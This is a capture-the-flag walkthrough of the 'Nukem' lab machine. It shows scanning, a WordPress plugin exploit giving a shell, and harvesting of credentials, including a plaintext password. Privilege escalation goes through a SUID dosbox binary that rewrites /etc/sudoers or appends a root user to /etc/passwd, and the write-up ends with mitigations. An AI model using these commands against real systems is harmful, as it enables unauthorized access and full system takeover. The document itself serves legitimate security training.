## Introduction
In this walkthrough we will be solving Proving Grounds Intermediate Linux box Nukem. Let’s start ..

## Nmap

### TCP

Run a quick Nmap scan:

```bash
sudo nmap -sV $IP --open
```

![image.png](image.png)

### UDP

UDP scan on top 100 ports:

```bash
sudo nmap -sU -F $IP
```

![image.png](image%201.png)

No valuable UDP ports found.

### Full Nmap Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n --open
```

## Services

### Port 22

We usually skip SSH.

### Port 3306

Our host is **not allowed** to connect to MySQL database.

## Port 36445

- Version **Samba smbd 4,** no public exploit.

## Web

### Port 80

- Visiting the site we see that it is wordpress site
    
    ![image.png](image%203.png)
    

I saw login page, when visiting it I used **admin:admin**, **admin:password**, it showed me that kind of error that indicates the user admin really exists we just didn’t parse the correct password for it:

![image.png](image%204.png)

From returned Nmap scan we see its version is **5.5.1**

Let’s perform **wpscan**

`sudo wpscan -e ap -t 500 --url http://$IP/`

**Vulnerable themes:**

**Vulnerable plugins:**

![image.png](image%206.png)

![image.png](image%207.png)

### Port 5000

- Accessing the page it shows Not Found
- searching for public exploits we can identify something that may be useful

```bash
searchsploit werkzeug
```

![image.png](image%208.png)

### Port 13000

- Version - nginx 1.18.0

I found some kind of login page but it does not return any output from errors and I don’t know default credentials

![image.png](image%209.png)

## Exploitation

Let’s search public exploits for them.

I found this [exploit](https://www.exploit-db.com/exploits/48979) for simple-file-list:

![image.png](image%2010.png)

Change the payload part of the exploit:

![image.png](image%2011.png)

![image.png](image%2012.png)

Now we have a shell:

![image.png](image%2013.png)

We remember that there was a MySQL instance running on the target let’s try to find credentials for it, actually we can do that running [linpeas.sh](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) for simplicity, if that won’t work we will switch to manual enumeration.

Digging through the linpeas output we can see credentials, but I used them and nothing can be done.

Analyzing linpeas output I saw a potential privilege escalation point too:

![image.png](image%2014.png)

## Lateral Movement

Analyzing further linpeas output we see credentials for commander user:

![image.png](image%2015.png)

## Credentials

```bash
commander : CommanderKeenVorticons1990
```

I tried to login using these credentials but it seems it cannot connect to it:

![image.png](image%2016.png)

Let’s use that password for user itself too:

![image.png](image%2017.png)

**Now that worked.**

Let’s interactive shell using python:

Identify python version : 

```bash
which python # or python --version:
```

![image.png](image%2018.png)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![image.png](image%2019.png)

## Privilege Escalation

### 1st way

We have seen dosbox SUID binary, there let’s check it out in [GTFOBins](https://gtfobins.github.io/#)

> Note that the name of the written file in the following example will be `FILE_TO_`. Also note that `echo` terminates the string with a DOS-style line terminator (`\r\n`), if that’s a problem and your scenario allows it, you can create the file outside `dosbox`, then use `copy` to do the actual write. 
{: .prompt-warning }

We can abuse `/etc/sudoers` file without problem because it is not dependent on correct and strict syntax as `/etc/passwd`, but we cannot do that for `/etc/passwd` as there each line should be terminated just with a newline character(`\n`) and nothing else.

```bash
LFILE='/etc/sudoers'
/usr/bin/dosbox -c 'mount c /' -c "echo commander    ALL=(ALL:ALL) ALL >c:$LFILE" -c exit
```

![image.png](image%2020.png)

![image.png](image%2021.png)

Now we are root!

### 2nd way

We should have some kind of GUI to open dosbox as it does not open in netcat shell.

![image.png](image%2022.png)

It seems VNC running on the host, let’s check it using 

```bash
ss -ntlpu
```

![image.png](image%2023.png)

We see port `5901`is working which is default port of VNC.

```bash
netstat -antp
```

![image.png](image%2024.png)

Running vncviewer

```bash
vncwiever -passwd passwd 127.0.0.1 
```

 does not work, we should forward that port to kali and access it from there.

SSH Local Port Forward:

```bash
ssh -L 1234:localhost:5901 commander@192.168.140.105
```

check it with 

```bash
netstat -antp
```

![image.png](image%2025.png)

Transfer password file from target to kali machine.

```bash
systemctl start ssh #start ssh in kali and use scp
scp passwd kali@192.168.45.237:/home/kali
vncviewer -passwd passwd 127.0.0.1:1234
```

![image.png](image%2026.png)

You can follow this [walkthrough](https://www.myhackingnotes.com/proving_grounds/forward.html) on how to abusing this binary wit GUI: 

Run `dosbox` 

```bash
/usr/bin/dosbox
```

This will run the binary as root.

![image.png](image%2027.png)

```bash
mount C: / #mount root to C drive
C: #change to C drive
```

That means we mount root directory to `C:` drive, and we will be able to access filesystem of kali as if we are in Windows. So as we are root let’s write a new user to `/etc/passwd` file:

```bash
openssl passwd "hello"
echo root2:\$1\$zjUmG1DR\$w7YPxgsYlWLUnT5ll/t0h/:0:0:root:/root:/bin/bash >> /etc/passwd
```

![image.png](image%2028.png)

> DOS uses **CRLF (`\r\n`)** as a line terminator, and `dosbox` emulates that behavior when processing `echo` commands. In the GUI, DOSBox may behave slightly differently because the input is being processed interactively. If you manually type the `echo` command in the GUI, it might not enforce the `\r\n` as strictly (or you might be bypassing it unintentionally by how you input the command).
{: .prompt-info } 
We can now see proof.txt easily but first we need to change a shell to root:

```bash
su root2
```

![image.png](image%2029.png)

Now we are root!

## Mitigation

1. **Keep Software Updated** – Regularly update WordPress and all installed plugins to prevent exploitation of known vulnerabilities. Disable unused plugins to reduce attack surface.
2. **Use Least Privilege for Credentials** – Store sensitive credentials securely using environment variables or a vault, and ensure they grant only necessary permissions. Regularly rotate passwords.
3. **Restrict SUID Binaries** – Remove unnecessary SUID permissions from binaries like `dosbox`, and use access control mechanisms to limit their execution.
4. **Secure VNC Access** – Disable VNC if not needed, enforce strong authentication, and use network segmentation to prevent unauthorized access.
5. **Protect `/etc/passwd` File** – Use strong access controls and monitoring tools to detect unauthorized modifications. Consider using `passwd` and `shadow` file separation for additional security.
